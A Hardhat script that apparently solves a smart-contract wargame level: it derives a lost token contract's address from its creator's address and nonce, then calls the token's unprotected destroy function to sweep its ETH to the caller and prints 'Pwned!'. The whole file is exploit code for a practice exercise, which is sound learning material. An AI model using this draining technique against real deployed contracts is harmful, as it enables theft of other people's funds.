const { ethers } = require("hardhat")

const recoveryInstanceAddress = "0x40172bD59fcE6CDdd931ff28BC6A8b7930757776"

async function main() {
  /* Get signers */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Connecting to Recovery contract */

  const recovery = await ethers.getContractAt("Recovery", recoveryInstanceAddress, deployer)
  console.log("Connected to your instance of Recovery contract!")

  /* Getting contract address*/

  // address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
  const simpleTokenAdd = await ethers.utils.solidityKeccak256(
    ["bytes1", "bytes1", "address", "bytes1"],
    ["0xd6", "0x94", recoveryInstanceAddress, "0x01"]
  )
  const simpleTokenAddress =
    "0x" + simpleTokenAdd.substring(simpleTokenAdd.length - 40, simpleTokenAdd.length)

  const simpleToken = await ethers.getContractAt("SimpleToken", simpleTokenAddress, deployer)
  console.log(`Connected to SimpleToken contract at address: ${simpleTokenAddress}`)

  const simpleTokenBalance = await ethers.provider.getBalance(simpleTokenAddress)
  console.log("SimpleToken ETH Balance: ", ethers.utils.formatEther(simpleTokenBalance))

  console.log("Destroying SimpleToken contract...")
  const destroySimpleToken = await simpleToken.destroy(deployer.address)
  await destroySimpleToken.wait(1)

  const endingSimpleTokenBalance = await ethers.provider.getBalance(simpleTokenAddress)
  console.log("SimpleToken ETH Balance: ", ethers.utils.formatEther(endingSimpleTokenBalance))

  console.log("Pwned!")
}

// Call th main function and log errors if any occur
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
